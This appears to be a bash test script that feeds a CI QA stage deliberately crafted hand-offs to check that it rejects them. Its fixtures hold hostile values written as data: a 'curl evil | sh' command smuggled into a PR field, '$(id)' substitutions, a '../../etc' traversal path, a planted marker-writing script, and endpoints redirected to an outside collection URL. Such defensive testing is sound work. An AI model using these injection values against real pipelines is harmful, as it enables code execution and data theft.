#!/bin/bash
# Local runs of the trusted QA stage against crafted hand-offs. No model key:
# valid cases use the recorded driver, so nothing here costs anything.
T="$1"
REPO_DIR=/home/user/ReleaseProof
SHA=2151181a0b409320ee6412f71faa55cbe6a3f238
cd "$REPO_DIR" || exit 1

run_case() {
  local name="$1" event="$2" branch="$3" tsha="$4"
  local dir="$T/$name"
  env -u GITHUB_TOKEN -u GH_TOKEN -u ANTHROPIC_API_KEY NODE_OPTIONS="--import gh/stub.mjs" timeout 240 npx tsx packages/agent/src/ci/cli.ts run \
    --incoming "$dir" --out "$dir/out" --repo ihsansengun/ReleaseProof \
    --event "$event" --head-branch "$branch" --head-sha "$tsha" --default-branch main \
    --previous "$dir/none.json" --full --max-usd 8 --max-tokens 3000000 --max-minutes 25 --max-scenarios 10 \
    > "$dir/log.txt" 2>&1
  echo "== $name: exit $? :: $(node -e 'const r=require(process.argv[1]);console.log(r.status+" | "+(r.reason||"")+(r.run?" | results "+r.run.results.map(x=>x.verdict[0]).join("")+" mode "+r.run.executionMode:""))' "$dir/out/ci-result.json" 2>/dev/null)"
  grep -E "^limits:|executor model|^driver:" "$dir/log.txt" | sed 's/^/     /'
}

fresh() {
  mkdir -p "$T/$1/context"
  cp --remove-destination "$T/base/image.tar" "$T/$1/image.tar"
  cp "$T/base/meta.json" "$T/base/full" "$T/$1/"
  cp "$T/base/context/"* "$T/$1/context/"
}

case "$2" in
  provenance)
    fresh other-pr; echo "{\"pr\":1,\"headSha\":\"$SHA\",\"appDir\":\"apps/timeoff\"}" > "$T/other-pr/meta.json"
    run_case other-pr workflow_dispatch main "$SHA"
    fresh wrong-commit; echo "{\"pr\":2,\"headSha\":\"$(printf 'c%.0s' $(seq 40))\",\"appDir\":\"apps/timeoff\"}" > "$T/wrong-commit/meta.json"
    run_case wrong-commit workflow_dispatch main "$SHA"
    fresh shell-chars; echo "{\"pr\":\"2; curl evil | sh\",\"headSha\":\"$SHA\",\"appDir\":\"apps/\$(id)\"}" > "$T/shell-chars/meta.json"
    run_case shell-chars workflow_dispatch main "$SHA"
    fresh traversal-appdir; echo "{\"pr\":2,\"headSha\":\"$SHA\",\"appDir\":\"../../etc\"}" > "$T/traversal-appdir/meta.json"
    run_case traversal-appdir workflow_dispatch main "$SHA"
    fresh untouched-app; echo "{\"pr\":2,\"headSha\":\"$SHA\",\"appDir\":\"apps/shop\"}" > "$T/untouched-app/meta.json"
    run_case untouched-app workflow_dispatch main "$SHA"
    fresh from-branch
    run_case from-branch workflow_dispatch attacker-branch "$SHA"
    fresh pr-event-other-sha
    run_case pr-event-other-sha pull_request some-branch "$(printf 'd%.0s' $(seq 40))"
    fresh odd-event
    run_case odd-event push main "$SHA"
    fresh not-json; echo 'not json' > "$T/not-json/meta.json"
    run_case not-json workflow_dispatch main "$SHA"
    ;;
  image)
    fresh mislabelled; docker save --output "$T/mislabelled/image.tar.new" relabelled >/dev/null 2>&1
    # the tar must carry the expected tag for the stage to look at it
    docker tag relabelled releaseproof-app-relabel >/dev/null
    docker image rm releaseproof-app >/dev/null 2>&1
    docker tag relabelled releaseproof-app && docker save --output "$T/mislabelled/image.tar" releaseproof-app
    run_case mislabelled workflow_dispatch main "$SHA"
    # restore the good image for later cases
    docker image rm releaseproof-app >/dev/null 2>&1
    docker load --input "$T/base/image.tar" >/dev/null
    fresh garbage-image; head -c 4096 /dev/urandom > "$T/garbage-image/image.tar"
    run_case garbage-image workflow_dispatch main "$SHA"
    ;;
  manifest)
    fresh bad-env; sed -i 's/    PORT: "3100"/    PORT: "3100"\n    "bad name; id": "x"/' "$T/bad-env/context/releaseproof.yml"
    run_case bad-env workflow_dispatch main "$SHA"
    fresh no-start; python3 - "$T/no-start/context/releaseproof.yml" <<'EOF'
import sys
s = open(sys.argv[1]).read()
open(sys.argv[1], 'w').write(s[:s.index('start:')])
EOF
    run_case no-start workflow_dispatch main "$SHA"
    ;;
  valid)
    fresh loosen
    echo '{"maxUsd":"9999","maxScenarios":"999","maxMinutes":"9999","maxTokens":"999999999999","executorModel":"evil-model; id","disableFallbacks":"$(id)"}' > "$T/loosen/limits.json"
    echo '#!/bin/sh
echo PWNED > /tmp/claude-pwned-marker' > "$T/loosen/run.sh"; chmod +x "$T/loosen/run.sh"
    echo 'echo PWNED' > "$T/loosen/context/postinstall.sh"
    sed -i 's#^baseUrl: .*#baseUrl: https://example.com#' "$T/loosen/context/releaseproof.yml"
    run_case loosen workflow_dispatch main "$SHA"
    ;;
  offorigin)
    fresh off-origin
    sed -i 's#    path: /api/test/users#    path: https://example.com/collect#' "$T/off-origin/context/releaseproof.yml"
    sed -i 's#  path: /api/version#  path: //example.com/version#' "$T/off-origin/context/releaseproof.yml"
    run_case off-origin workflow_dispatch main "$SHA"
    node -e 'const r=require(process.argv[1]);for(const x of (r.run?.results??[]).slice(0,3))console.log("     "+x.scenarioId+" "+x.verdict+": "+x.reason.slice(0,140))' "$T/off-origin/out/ci-result.json"
    ;;
esac
